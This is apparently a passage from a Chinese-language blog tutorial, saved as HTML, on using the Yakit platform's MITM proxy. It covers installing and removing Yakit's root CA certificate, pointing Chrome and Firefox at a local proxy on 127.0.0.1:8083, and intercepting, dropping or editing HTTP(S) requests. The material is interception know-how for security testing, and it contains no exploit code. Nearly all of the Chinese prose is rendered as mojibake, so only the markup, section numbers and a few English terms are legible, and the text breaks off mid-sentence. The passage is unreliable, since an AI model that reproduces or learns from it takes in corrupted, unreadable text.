¹æ®å›¾ä¸­æ‰€ç¤ºé…ç½®å¥½ä»£ç†çš„ç›‘å¬ç«¯å£å’Œæµè§ˆå™¨çš„ä»£ç†æœåŠ¡å™¨è®¾ç½®ï¼Œç„¶åç‚¹å‡»â‘¢<code>é«˜çº§é…ç½®</code>å¹¶ä¸‹è½½è¯ä¹¦ã€‚</p><p>*<strong>æ³¨ï¼šå…³äºæµè§ˆå™¨çš„ä»£ç†æœåŠ¡å™¨è®¾ç½®çš„è¯¦ç»†å†…å®¹å°†åœ¨ä¸‹ä¸€ç« èŠ‚ï¼ˆä»£ç†å’Œæµè§ˆå™¨é…ç½®ï¼‰ä¸­è¿›è¡Œä»‹ç»ã€‚*</strong></p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.13.47.png" style="zoom:50%;"></li><li><p>ç‚¹å‡»ä¸‹å›¾æ‰€ç¤ºçš„<code>è¯ä¹¦ä¸‹è½½</code>,æˆ–è€…åœ¨è®¾ç½®ä»£ç†åè®¿é—®ï¼š<a href="http://download-mitm-cert.yaklang.io/">http://download-mitm-cert.yaklang.io</a> è¿›è¡Œä¸‹è½½ï¼Œå¦å­˜ä¸ºåˆ°æœ¬åœ°ç›®å½•ã€‚</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.14.30.png" style="zoom:50%;"><ol start="3"><li>ä¿®æ”¹ä¸‹è½½è¯ä¹¦çš„åç¼€ï¼Œå»æ‰â€œ.pemâ€ï¼ŒåŒå‡»è¿›è¡Œå®‰è£…ï¼Œè¯ä¹¦å­˜å‚¨é€‰æ‹© â€˜å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€™</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.15.07.png" style="zoom:40%;"><blockquote><p>CRTå’ŒPEMæ˜¯ä¸¤ç§å¸¸è§çš„æ•°å­—è¯ä¹¦æ ¼å¼ï¼Œç”¨äºåŠ å¯†å’ŒéªŒè¯é€šä¿¡è¿‡ç¨‹ä¸­çš„æ•°æ®å®‰å…¨ã€‚</p><p>CRTæ˜¯ä¸€ä¸ªX.509è¯ä¹¦æ–‡ä»¶æ ¼å¼ï¼ŒPEMæ˜¯ä¸€ç§å¯æ‰“å°çš„è¯ä¹¦æ–‡ä»¶æ ¼å¼ï¼Œå¯ä»¥åŒ…å«å¤šç§ç±»å‹çš„åŠ å¯†å’Œå…¬é’¥è¯ä¹¦ã€‚PEMæ ¼å¼é€šå¸¸ä½¿ç”¨base64ç¼–ç ï¼Œå¹¶ä¸”ä»¥â€œâ€”â€“BEGIN CERTIFICATEâ€”â€“â€å’Œâ€œâ€”â€“END CERTIFICATEâ€”â€“â€ä¹‹é—´çš„æ–‡æœ¬å—åŒ…å«è¯ä¹¦æ•°æ®ã€‚PEMæ ¼å¼è¿˜å¯ä»¥ç”¨äºå­˜å‚¨å¯†é’¥ã€è¯ä¹¦è¯·æ±‚å’Œå…¶ä»–ç±»å‹çš„åŠ å¯†æ•°æ®ã€‚CRTæ ¼å¼æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ ¼å¼ï¼ŒåŒ…å«ç”¨äºéªŒè¯æ•°å­—è¯ä¹¦æœ‰æ•ˆæ€§çš„å…¬é’¥ã€è¯ä¹¦æŒæœ‰è€…çš„ä¿¡æ¯ä»¥åŠè¯ä¹¦ç­¾åã€‚CRTæ ¼å¼é€šå¸¸ç”¨äºå®‰è£…æ•°å­—è¯ä¹¦åˆ°WebæœåŠ¡å™¨æˆ–å…¶ä»–åº”ç”¨ç¨‹åºä¸­ã€‚åœ¨å®è·µä¸­ï¼ŒPEMæ ¼å¼æ¯”CRTæ ¼å¼æ›´ä¸ºå¸¸è§ï¼Œå› ä¸ºPEMæ ¼å¼çš„æ–‡ä»¶å¯ä»¥è½»æ¾åœ°é€šè¿‡æ–‡æœ¬ç¼–è¾‘å™¨è¿›è¡ŒæŸ¥çœ‹å’Œç¼–è¾‘ï¼Œå¹¶ä¸”PEMæ ¼å¼ä¹Ÿå¯ä»¥åŒ…å«å¤šç§ç±»å‹çš„åŠ å¯†å’Œå…¬é’¥è¯ä¹¦ã€‚ä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¾‹å¦‚åœ¨å®‰è£…æ•°å­—è¯ä¹¦åˆ°WebæœåŠ¡å™¨ä¸Šæ—¶ï¼ŒCRTæ ¼å¼å¯èƒ½æ›´ä¸ºæ–¹ä¾¿ã€‚</p></blockquote><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å®ŒæˆYakit-MITMè¯ä¹¦çš„å®‰è£…ï¼Œåœ¨Yakitä¸­å¯ä»¥å¯¹HTTPSè¯·æ±‚è¿›è¡ŒæŠ“åŒ…ã€‚</p><h3 id="11-4-2-CAè¯ä¹¦çš„å¸è½½"><a href="#11-4-2-CAè¯ä¹¦çš„å¸è½½" class="headerlink" title="11.4.2 CAè¯ä¹¦çš„å¸è½½"></a>11.4.2 CAè¯ä¹¦çš„å¸è½½</h3><ul><li>ç¬¬ä¸€ç§æ–¹å¼:ä»¥è°·æ­Œæµè§ˆå™¨ä¸ºä¾‹ï¼šæ‰“å¼€è°·æ­Œæµè§ˆå™¨â†’æ‰“å¼€å³ä¸Šè§’æ›´å¤šé€‰é¡¹å¡â†’<code>è®¾ç½®</code>â†’<code>éšç§è®¾ç½®å’Œå®‰å…¨æ€§</code>â†’<code>ç®¡ç†è®¾å¤‡è¯ä¹¦</code>â†’<code>å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„</code> é€‰æ‹©è¯ä¹¦ç„¶åç‚¹å‡»åˆ é™¤</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.17.30.png" style="zoom:45%;"><ul><li>ç¬¬äºŒç§æ–¹å¼ï¼šç¬¬äºŒç§åˆ é™¤æ–¹å¼ï¼Œä¸»è¦æ˜¯ä¸ºäº†è§£å†³åœ¨ç¬¬ä¸€ç§æ–¹å¼çš„åŸºç¡€ä¸Šåˆ é™¤æŒ‰é’®å¤±æ•ˆæˆ–è€…è¯ä¹¦åˆ—è¡¨ä¸­å…¶ä»–çš„è¯ä¹¦è¯¯åˆ é™¤çš„æ–¹æ³•ã€‚</li></ul><ol><li>æ‰“å¼€cmdâ†’è¾“å…¥mmcâ†’ç‚¹å‡»<code>æ–‡ä»¶</code>èœå•ï¼Œé€‰æ‹©<code>æ·»åŠ /åˆ é™¤ç®¡ç†å•å…ƒ</code>â†’å¦‚ä¸‹å›¾æ‰¾åˆ°<code>è¯ä¹¦</code>ï¼Œç‚¹å‡»<code>æ·»åŠ </code></li><li>åœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é»˜è®¤é€‰ä¸­<code>æˆ‘å½“å‰çš„ç”¨æˆ·</code>ï¼Œç‚¹å‡»<code>å®Œæˆ</code>ï¼Œç»“æŸåï¼Œä¼šåœ¨<code>æ§åˆ¶å°è·ŸèŠ‚ç‚¹</code>ä¸‹å¤šäº†ä¸€ä¸ª<code>è¯ä¹¦-å½“å‰ç”¨æˆ·</code>çš„èŠ‚ç‚¹,æ‰“å¼€Yakit CAè¯ä¹¦æ‰€åœ¨çš„ä½ç½®ï¼Œé€‰æ‹©åˆ é™¤å³å¯</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.18.41.png" style="zoom:45%;"><h2 id="11-5-ä»£ç†å’Œæµè§ˆå™¨è®¾ç½®"><a href="#11-5-ä»£ç†å’Œæµè§ˆå™¨è®¾ç½®" class="headerlink" title="11.5 ä»£ç†å’Œæµè§ˆå™¨è®¾ç½®"></a>11.5 ä»£ç†å’Œæµè§ˆå™¨è®¾ç½®</h2><p>Yakit MITMæ¨¡å—ä»¥æ‹¦æˆªä»£ç†çš„æ–¹å¼æˆªè·æ‰€æœ‰é€šè¿‡ä»£ç†çš„ç½‘ç»œæµé‡ï¼ŒåŒ…æ‹¬å®¢æˆ·ç«¯çš„è¯·æ±‚æ•°æ®å’ŒæœåŠ¡å™¨ç«¯çš„å“åº”ä¿¡æ¯ã€‚ä¸»è¦æ‹¦æˆªhttpå’Œhttpsåè®®çš„æµé‡ï¼Œå¹¶é€šè¿‡ä¸­é—´äººæ–¹å¼ï¼Œå¯¹å®¢æˆ·ç«¯è¯·æ±‚å’ŒæœåŠ¡ç«¯å“åº”è¿›è¡Œå¤„ç†ï¼Œä»¥å®ç°å®‰å…¨è¯„ä¼°æµ‹è¯•çš„ç›®çš„ã€‚</p><p>åœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œæˆ‘ä»¬æœ€å¸¸ä½¿ç”¨çš„æ˜¯webæµè§ˆå™¨ä½œä¸ºwebå®¢æˆ·ç«¯ã€‚é€šè¿‡è®¾ç½®ä»£ç†ï¼Œæˆ‘ä»¬å¯ä»¥æˆªå–webæµè§ˆå™¨çš„æµé‡ï¼Œå¹¶å¯¹æµç»Yakitä»£ç†çš„æ•°æ®è¿›è¡Œå¤„ç†ã€‚è¿™ç§æ–¹å¼å¯ä»¥æ¨¡æ‹Ÿå„ç§æ”»å‡»åœºæ™¯ï¼Œå¸®åŠ©æµ‹è¯•äººå‘˜å‘ç°åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨æ¼æ´ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å°±ä»‹ç»ä¸‹åœ¨å¸¸ç”¨æµè§ˆå™¨Firefoxå’ŒGoogle Chromeä¸‹æ˜¯å¦‚ä½•é…ç½®Yakitçš„ä»£ç†ã€‚</p><h3 id="11-5-1-Google-Chromeä»£ç†è®¾ç½®"><a href="#11-5-1-Google-Chromeä»£ç†è®¾ç½®" class="headerlink" title="11.5.1 Google Chromeä»£ç†è®¾ç½®"></a>11.5.1 Google Chromeä»£ç†è®¾ç½®</h3><p>Google Chromeä½¿ç”¨Yakitä½œä¸ºä»£ç†æœåŠ¡å™¨çš„é…ç½®æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å¯åŠ¨Yakit æ‰“å¼€ MITM äº¤äº’åŠ«æŒï¼Œé…ç½®ä»£ç†åœ°å€å’Œç«¯å£ 127.0.0.1:8083ï¼Œç‚¹å‡»åŠ«æŒå¯åŠ¨ï¼Œç¡®ä¿åŠ«æŒå¤„äºå¼€å¯çŠ¶æ€ã€‚</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.22.46.png" alt="æˆªå±2024-12-25 11.22.46" style="zoom:50%;"><ol start="2"><li><p>åœ¨Chromeæµè§ˆå™¨ä¸­ï¼Œç‚¹å‡»æµè§ˆå™¨å³ä¸Šè§’çš„ä¸‰ä¸ªç‚¹æŒ‰é’®ï¼Œé€‰æ‹©â€œè®¾ç½®â€é€‰é¡¹ã€‚</p></li><li><p>åœ¨â€œè®¾ç½®â€é¡µé¢ä¸­ï¼Œå‘ä¸‹æ»šåŠ¨åˆ°åº•éƒ¨ï¼Œæ‰¾åˆ°â€œç³»ç»Ÿâ€é€‰é¡¹ï¼Œç‚¹å‡»â€œæ‰“å¼€ä»£ç†è®¾ç½®â€æŒ‰é’®</p></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.23.04.png" style="zoom:50%;"><ol start="4"><li><p>åœ¨â€œä»£ç†â€é€‰é¡¹å¡ä¸­ï¼Œæ‰“å¼€<code>æ‰‹åŠ¨è®¾ç½®ä»£ç†æœåŠ¡å™¨</code>ä¸‹çš„<code>ä½¿ç”¨ä»£ç†æœåŠ¡å™¨</code>ï¼Œåœ¨â€œåœ°å€â€å’Œâ€œç«¯å£â€æ–‡æœ¬æ¡†ä¸­è¾“å…¥å‰é¢è®¾ç½®çš„Yakit MITM çš„ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£å·ï¼ˆ127.0.0.1:8083ï¼‰</p></li><li><p>ç‚¹å‡»<code>ä¿å­˜</code>æŒ‰é’®ä¿å­˜è®¾ç½®å¹¶å…³é—­æ‰€æœ‰çª—å£ã€‚</p></li></ol><h3 id="11-5-2-FireFoxè®¾ç½®"><a href="#11-5-2-FireFoxè®¾ç½®" class="headerlink" title="11.5.2 FireFoxè®¾ç½®"></a>11.5.2 FireFoxè®¾ç½®</h3><p>ä¸Google Chrome çš„è®¾ç½®ç±»ä¼¼ï¼Œåœ¨FireFoxä¸­ï¼Œæˆ‘ä»¬ä¹Ÿè¦è¿›è¡Œä»£ç†çš„è®¾ç½®ï¼Œæ‰èƒ½å°†FireFoxæµè§ˆå™¨çš„é€šä¿¡æµé‡ï¼Œé€šè¿‡ Yakit çš„ä»£ç†è¿›è¡Œä¼ è¾“ã€‚è¯¦ç»†çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å¯åŠ¨Yakit æ‰“å¼€ MITM äº¤äº’åŠ«æŒï¼Œé…ç½®ä»£ç†åœ°å€å’Œç«¯å£ 127.0.0.1:8083ï¼Œç‚¹å‡»åŠ«æŒå¯åŠ¨ï¼Œç¡®ä¿åŠ«æŒå¤„äºå¼€å¯çŠ¶æ€ã€‚</li><li>ä¸‹è½½æœ€æ–°ç‰ˆFirefoxæµè§ˆå™¨ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œç‚¹å‡»å³ä¸Šè§’çš„èœå•æŒ‰é’®ï¼ˆä¸‰æ¡æ¨ªçº¿ï¼‰ï¼Œé€‰æ‹©<code>è®¾ç½®</code>é€‰é¡¹ã€‚</li><li>å·¦ä¾§èœå•ä¸­é€‰æ‹©<code>å¸¸è§„</code>,ç„¶åä¸‹æ‹‰è‡³æœ€åº•éƒ¨çš„<code>ç½‘ç»œè®¾ç½®</code>ï¼Œç‚¹å‡»<code>è®¾ç½®</code></li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.28.png" style="zoom:50%;"><ol start="4"><li>åœ¨<code>è¿æ¥è®¾ç½®</code>å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©<code>æ‰‹åŠ¨ä»£ç†é…ç½®</code>é€‰é¡¹,åœ¨<code>HTTPä»£ç†</code>æ–‡æœ¬æ¡†ä¸­è¾“å…¥ Yakit ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€å’Œç«¯å£å·ï¼ˆé»˜è®¤ä¸º127.0.0.1:8083ï¼‰</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.24.56.png" style="zoom:40%;"><ol start="5"><li>å‹¾é€‰<code>ä¹Ÿå°†æ­¤ä»£ç†ç”¨äº HTTPS</code>å¤é€‰æ¡†ï¼Œç‚¹å‡»ç¡®å®šï¼Œè®¾ç½®å®Œæˆã€‚</li></ol><p>ä»¥ä¸Šå°±æ˜¯ä»£ç†å’Œæµè§ˆå™¨è®¾ç½®çš„æ‰€æœ‰å†…å®¹ã€‚å½“ç„¶ï¼Œæµè§ˆå™¨ä¸­ï¼Œå¯ä»¥æ·»åŠ ä¸€äº›æ‰©å±•ç»„ä»¶ï¼Œå¯¹ä»£ç†æœåŠ¡å™¨è¿›è¡Œç®¡ç†ã€‚å¦‚Proxy Switherã€Proxy SwitchyOmegaç­‰ç­‰éƒ½æ˜¯å¾ˆå¥½ç”¨çš„æ’ä»¶ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒYakitè¿˜æä¾›äº†ç³»ç»Ÿä»£ç†ï¼Œç³»ç»Ÿä»£ç†èƒ½å¸®åŠ©ç”¨æˆ·è‡ªåŠ¨ä»£ç†ç³»ç»Ÿæ‰€æœ‰è¯·æ±‚å…¨å±€æŠ“åŒ…ã€‚ç³»ç»Ÿä»£ç†æ‰“å¼€çš„å…·ä½“ä½ç½®åœ¨åŠ«æŒç•Œé¢çš„å³ä¸Šè§’ã€‚ç‚¹å‡»å¯ç”¨åå³å¯å¼€å§‹å…¨å±€æŠ“åŒ…ï¼Œæ˜¾ç¤ºâ€œå·²å¯ç”¨â€è¡¨ç¤ºå¯ç”¨æˆåŠŸï¼Œç³»ç»Ÿæ‰€æœ‰è¯·æ±‚æ•°æ®åŒ…å‡å¯æŠ“å–ã€‚æ­¤åŠŸèƒ½å¸¸ç”¨æ¥æŠ“å–å¾®ä¿¡å°ç¨‹åºã€é’‰é’‰ç­‰åº”ç”¨çš„æ•°æ®åŒ…ã€‚ã€ä½†æ˜¯åœ¨v1.3.8-1220æ²¡æœ‰æ‰¾åˆ°ç³»ç»Ÿä»£ç†åŠŸèƒ½ï¼Œå¤šäº†ä¸€ä¸ªä¸‹æ¸¸ä»£ç†é…ç½®ï¼Œç›®æµ‹æ˜¯ç”¨æ¥è®¾ç½®å¤šå±‚ä»£ç†çš„ã€‚ã€‘</p><h2 id="11-6-å¼€å§‹åŠ«æŒ"><a href="#11-6-å¼€å§‹åŠ«æŒ" class="headerlink" title="11.6 å¼€å§‹åŠ«æŒ"></a>11.6 å¼€å§‹åŠ«æŒ</h2><p>æˆ‘ä»¬å·²ç»é…ç½®å¥½äº†å¼€å§‹åŠ«æŒå‰çš„å‡†å¤‡å·¥ä½œã€‚</p><p>åœ¨å¼€å§‹åŠ«æŒå‰æˆ‘ä»¬å…ˆå¯¹æ•´ä¸ªåŠ«æŒé¡µé¢è¿›è¡Œç†Ÿæ‚‰ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.32.36.png" alt="æˆªå±2024-12-25 11.32.36" style="zoom:50%;"><ol><li>è®¾ç½®ä»£ç†ç›‘å¬ä¸»æœºï¼Œè¿œç¨‹æ¨¡å¼å¯ä»¥ä¿®æ”¹ä¸º0.0.0.0ä»¥ç›‘å¬ä¸»æœºæ‰€æœ‰ç½‘å¡ã€‚</li><li>è®¾ç½®ä»£ç†ç›‘å¬ç«¯å£ï¼Œè®¾ç½®ä¸€ä¸ªä¸è¢«å ç”¨çš„ç«¯å£ã€‚</li><li>å¼€å¯è¯¥é€‰é¡¹å°†æ”¯æŒ HTTP/2.0 åŠ«æŒï¼Œå…³é—­åè‡ªåŠ¨é™çº§ä¸ºHTTP1.1ï¼Œå¼€å¯å HTTP2 åå•†å¤±è´¥ä¹Ÿä¼šè‡ªåŠ¨é™çº§ã€‚</li><li>æ ¹æ®å¡«å†™çš„æ­£åˆ™è§„åˆ™ï¼Œå¯¹ç¬¦åˆè§„åˆ™çš„æ•°æ®åŒ…è¿›è¡ŒæŸ“è‰²ã€æ ‡è®°ã€æ›¿æ¢ã€æ‰“tagç­‰æ“ä½œï¼Œæ–¹ä¾¿ç”¨æˆ·å¿«é€Ÿç­›é€‰å‡ºç›®æ ‡æ•°æ®åŒ…ã€‚Yakitç›®å‰æä¾›55æ¡é»˜è®¤è§„åˆ™ï¼Œç‚¹å‡»<code>é»˜è®¤é…ç½®</code>å¯¼å…¥å³å¯ä½¿ç”¨ã€‚</li><li>å¼€å¯å¯ç”¨æ’ä»¶åˆ™è¡¨ç¤ºï¼Œè¿›å…¥åŠ«æŒé¡µé¢å°±ä¼šåŠ è½½åœ¨ä¾§è¾¹æ  â‘¥ å½“ä¸­é€‰æ‹©çš„æ’ä»¶ä»¥åŠç¼–å†™æ’ä»¶æ—¶è®¾ç½®äº†é»˜è®¤å¯åŠ¨çš„æ’ä»¶ã€‚</li><li>æ’ä»¶å•†åº—å½“ä¸­çš„â€MITMæ’ä»¶â€ å’Œ â€œç«¯å£æ‰«ææ’ä»¶â€ç±»å‹çš„æ’ä»¶ã€‚</li><li>æ’ä»¶åˆ†ç»„ï¼šå°†æ’ä»¶æŒ‰ç…§è‡ªå·±çš„ä½¿ç”¨ä¹ æƒ¯è¿›è¡Œåˆ†ç»„ï¼Œä¾¿äºåœ¨ä½¿ç”¨æ’ä»¶æ—¶å¿«é€Ÿå‹¾é€‰è‡ªå·±éœ€è¦çš„æ’ä»¶ã€‚æ’ä»¶ç»„åœ¨æ•´ä¸ªYakité‡Œæ˜¯å…±ç”¨çš„ï¼Œåªè¦æœ‰åŠ è½½æ’ä»¶çš„åœ°æ–¹å°±ä½¿ç”¨æ’ä»¶åˆ†ç»„ã€‚</li><li>æ ¹æ®å…³é”®å­—æˆ–è€…tagå¿«é€Ÿæœç´¢æ‰€éœ€æ’ä»¶ã€‚</li><li>ä¸‹æ‹‰æ˜¾ç¤ºå·²åˆ›å»ºè¿‡çš„åˆ†ç»„ï¼Œå¹¶è¿›è¡Œåˆ†ç»„é€‰æ‹©ã€‚</li><li>é«˜çº§é…ç½®ï¼š</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.20.45.png" style="zoom:50%;"><ol start="11"><li><p>ä¸ºåŠ«æŒå†è®¾ç½®ä¸€ä¸ªä»£ç†ï¼Œé€šå¸¸ç”¨äºè®¿é—®ä¸­å›½å¤§é™†æ— æ³•è®¿é—®çš„ç½‘ç«™æˆ–è®¿é—®ç‰¹æ®Šç½‘ç»œ/å†…ç½‘ï¼Œä¹Ÿå¯ç”¨äºæ¥å…¥xrayç­‰è¢«åŠ¨æ‰«æã€‚</p></li><li><p>å®¢æˆ·ç«¯TLSï¼šå¯¼å…¥TSLè¯ä¹¦ï¼Œç”¨äº mTLSï¼ˆMutual TLSï¼‰å¼€å¯å®¢æˆ·ç«¯éªŒè¯çš„ HTTPS ç½‘ç«™æŠ“åŒ…ã€‚</p></li><li><p>è¿‡æ»¤å™¨ï¼šé€šè¿‡é…ç½®è¿‡æ»¤æ¡ä»¶ï¼Œæ¥æ§åˆ¶åªæŠ“/ä¸æŠ“å“ªäº›æ•°æ®åŒ…ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºåŠ«æŒçš„â€œé»‘ç™½åå•â€ã€‚</p></li><li><p>ä¸‹è½½Yakitè¯ä¹¦ã€‚</p></li></ol><p>ç‚¹å‡»<code>åŠ«æŒå¯åŠ¨</code>åè¿›å…¥åˆ°åŠ«æŒç•Œé¢ï¼šé€‰æ‹©<code>ä¸¢å¼ƒè¯·æ±‚</code>ï¼Œåˆ™è¯¥æ¡æ•°æ®ä¸ä¼šå‡ºç°åœ¨historyï¼Œ<code>æäº¤æ•°æ®</code>åˆ™ä¼šå°†è¯¥æ•°æ®åŒ…è®°å½•åœ¨history å¹¶å¼€å§‹åŠ«æŒä¸‹ä¸€ä¸ªæ•°æ®åŒ…ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.26.32.png" style="zoom:50%;"><ol><li>åœ¨åŠ«æŒé¡µé¢çš„å·¦ä¸Šè§’çš„â‘ å•é€‰æ¡†é€‰æ‹©<code>æ‰‹åŠ¨åŠ«æŒ</code>ï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥ä½ éœ€è¦è®¿é—®çš„URLï¼ˆä»¥<a href="https://baidu.com/">https://baidu.com/</a> ä¸ºä¾‹ï¼‰å¹¶å›è½¦ï¼Œè¿™æ—¶ä½ å°†ä¼šçœ‹åˆ°æ•°æ®æµé‡ç»è¿‡ Yakit å¹¶æš‚åœï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹æˆ–ä¿®æ”¹æ•°æ®åŒ…ã€‚é€‰æ‹©<code>è‡ªåŠ¨æ”¾è¡Œ</code>åˆ™ä¼šæ”¾è¡Œæ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œ<code>è¢«åŠ¨æ—¥å¿—</code>åˆ™ä¸ºåŠ«æŒæ¨¡å—ã€æ’ä»¶åŠ è½½ã€è¢«åŠ¨æ‰«æçš„æ‰§è¡Œæ—¥å¿—ã€‚</li><li>é€‰æ‹©<code>æ‰‹åŠ¨åŠ«æŒ</code>åŠ«æŒåˆ°è¯·æ±‚ä»¥åï¼Œç‚¹å‡»å³è¾¹â‘¡ <code>ä¸¢å¼ƒè¯·æ±‚</code> åˆ™è¯¥æ¡æ•°æ®å°†ä¼šä¸¢å¤±ï¼Œä¸åœ¨ç»§ç»­å¤„ç†ä¸”ä¸ä¼šå‡ºç°åœ¨<code>history</code>ä¸­ï¼Œâ‘¢<code>æäº¤æ•°æ®</code>åˆ™ä¼šå°†è¯¥æ•°æ®åŒ…ç»§ç»­ä¼ è¾“ä¸‹å»å¹¶è®°å½•åœ¨<code>history</code>å¹¶å¼€å§‹åŠ«æŒä¸‹ä¸€ä¸ªæ•°æ®åŒ…ã€‚</li><li>åŠ«æŒåˆ°è¯·æ±‚ä»¥åï¼Œåœ¨å³è¾¹å•é€‰æ¡†â‘£<code>åŠ«æŒå“åº”</code>å¤„é€‰æ‹©å½“å‰è¯·æ±‚ï¼Œåˆ™ä¼šåŠ«æŒåˆ°å½“å‰è¯·æ±‚åŒ…å¯¹åº”çš„å“åº”æ•°æ®åŒ…ã€‚é€‰æ‹©â€æ‰€æœ‰â€åˆ™ä¼šåŠ«æŒæ‰€æœ‰è¯·æ±‚çš„å“åº”æ•°æ®åŒ…ã€‚</li><li>åœ¨æ•´ä¸ªæ•°æ®åŒ…å±•ç¤ºå¤„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°HTTPè¯·æ±‚çš„æ•°æ®è¿›è¡Œæ‰‹å·¥çš„ä¿®æ”¹ï¼Œæ•°æ®ä¸»è¦åŒ…å«äº†ï¼šè¯·æ±‚åœ°å€ã€httpåè®®ç‰ˆæœ¬ã€ä¸»æœºå¤´ã€æµè§ˆå™¨ä¿¡æ¯ã€Acceptå¯æ¥å—çš„å†…å®¹ç±»å‹ã€å­—ç¬¦é›†ã€ç¼–ç æ–¹å¼ã€cookieç­‰ï¼Œç‚¹å‡»é¼ æ ‡å³é”®å¯ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œæ›´å¤šçš„æ“ä½œï¼š</li></ol><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2013.29.53.png" style="zoom:50%;"><ol start="5"><li>åŠ«æŒåˆ°çš„æ‰€æœ‰çš„æ•°æ®åŒ…éƒ½ä¼šå­˜å…¥åˆ°<code>history</code>ä¸­ï¼ŒåŠ«æŒåå¯ä»¥åœ¨<code>history</code>æŸ¥çœ‹æ„Ÿå…´è¶£çš„æ•°æ®åŒ…ã€‚</li></ol><h2 id="11-7-æ ‡è®°-æ›¿æ¢æµé‡"><a href="#11-7-æ ‡è®°-æ›¿æ¢æµé‡" class="headerlink" title="11.7 æ ‡è®°/æ›¿æ¢æµé‡"></a>11.7 æ ‡è®°/æ›¿æ¢æµé‡</h2><p>åœ¨æ—¥å¸¸çš„å·¥ä½œä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹æµ‹è¯•çš„ç›®æ ‡ç½‘ç«™è¿›è¡Œæµé‡åˆ†æï¼›å½“ç„¶é™¤äº†åœ¨åˆ†ææµé‡ä¹‹å¤–ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦æ¶‰åŠä¸€äº›æ“ä½œï¼Œä»¥å®ç°å¯¹æµé‡çš„ä¿®æ”¹ã€‚</p><p>ä½œä¸ºä¸€ä¸ªåˆæ ¼çš„å·¥ç¨‹å¸ˆï¼Œä»»ä½•æ—¶å€™æŒæ¡å¯¹æµé‡çš„å®Œå…¨æ§åˆ¶æƒå…¶å®æ˜¯éå¸¸é‡è¦çš„åŸºæœ¬æŠ€èƒ½ã€‚</p><p>è¯¥åŠŸèƒ½ä¸»è¦æ˜¯æ›¿æ¢æ•°æ®åŒ…ä¸­ç¬¦åˆè§„åˆ™çš„å†…å®¹ï¼Œæ¯”å¦‚æ›¿æ¢æ•°æ®åŒ…ä¸­è‡ªå·±çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¯¹æ•°æ®åŒ…è¿›è¡Œé¢œè‰²æ ‡è®°æˆ–è€…æ‰“ä¸Šæ ‡ç­¾ï¼Œæ–¹ä¾¿å¯¹æ•°æ®åŒ…è¿›è¡Œåˆ†ç±»ï¼Œæˆ–å¿«é€Ÿæ‰¾å‡ºè‡ªå·±æ„Ÿå…´è¶£çš„æ•°æ®åŒ…ã€‚</p><h3 id="11-7-1-å¯¼å…¥-å¯¼å‡ºè§„åˆ™"><a href="#11-7-1-å¯¼å…¥-å¯¼å‡ºè§„åˆ™" class="headerlink" title="11.7.1 å¯¼å…¥/å¯¼å‡ºè§„åˆ™"></a>11.7.1 å¯¼å…¥/å¯¼å‡ºè§„åˆ™</h3><p>åœ¨å¯åŠ¨ MITM ä¹‹å‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥é…ç½®è¿™äº›è§„åˆ™ï¼Œå½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ MITM 